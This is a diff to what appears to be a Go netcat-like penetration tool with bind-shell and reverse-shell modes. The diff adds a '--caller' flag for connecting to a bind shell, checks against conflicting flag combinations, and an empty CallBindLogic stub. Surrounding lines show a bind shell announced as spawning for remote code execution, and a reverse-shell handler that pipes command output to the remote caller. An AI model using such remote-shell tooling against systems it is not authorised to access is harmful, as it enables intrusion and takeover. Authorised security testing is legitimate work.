@@ -17,6 +17,7 @@ type NetcatInput struct {
 	Port        int
 	Bind        bool
 	Reverse     bool
+	Caller      bool
 }
 
 func (nni *NetcatInput) SetNetcatInput(fs *flag.FlagSet) {
@@ -24,6 +25,7 @@ func (nni *NetcatInput) SetNetcatInput(fs *flag.FlagSet) {
 	fs.IntVar(&nni.Port, "port", 8080, "Provide a port to bind to on this host")
 	fs.BoolVar(&nni.Bind, "bind", false, "Set Flag for Bind shell. Note: do not use with --reverse")
 	fs.BoolVar(&nni.Reverse, "reverse", false, "Set Flag for a Reverse Shell. Note: do not use with --bind")
+	fs.BoolVar(&nni.Caller, "caller", false, "Call to a bind shell.")
 }
 
 func NetcatBind(nni *NetcatInput) {
@@ -33,8 +35,17 @@ func NetcatBind(nni *NetcatInput) {
 		callAddress = fmt.Sprintf("%s:%d", nni.HostAddress, nni.Port)
 	)
 
+	if nni.Bind && nni.Reverse && nni.Caller {
+		log.Fatalln("Cannot bind, reverse, and call at the same time.")
+	}
 	if nni.Bind && nni.Reverse {
 		log.Fatalln("Cannot bind and reverse at the same time.")
+	}
+	if nni.Bind && nni.Caller {
+		log.Fatalln("Cannot bind and call at the same time.")
+	}
+	if nni.Reverse && nni.Caller {
+		log.Fatalln("Cannot reverse and call at the same time.")
 	}
 
 	if nni.Bind {
@@ -42,6 +53,9 @@ func NetcatBind(nni *NetcatInput) {
 	}
 	if nni.Reverse {
 		ReverseLogic(callAddress, osRuntime)
+	}
+	if nni.Caller {
+		CallBindLogic(callAddress, osRuntime)
 	}
 }
 
@@ -72,6 +86,7 @@ func BindLogic(bindAddress string, osRuntime string) {
 	if err != nil {
 		log.Fatalf("Unable to bind to port %s", bindAddress)
 	}
+	defer listener.Close()
 	log.Println("[*] Binding shell spawning for remote code execution")
 	for {
 		conn, err := listener.Accept()
@@ -156,4 +171,8 @@ func RevHandleDarwin(caller net.Conn) {
 	cmd.Stdout = caller
 	cmd.Stderr = caller
 	cmd.Run()
+}
+
+func CallBindLogic(callAddress string, osRuntime string) {
+
 }
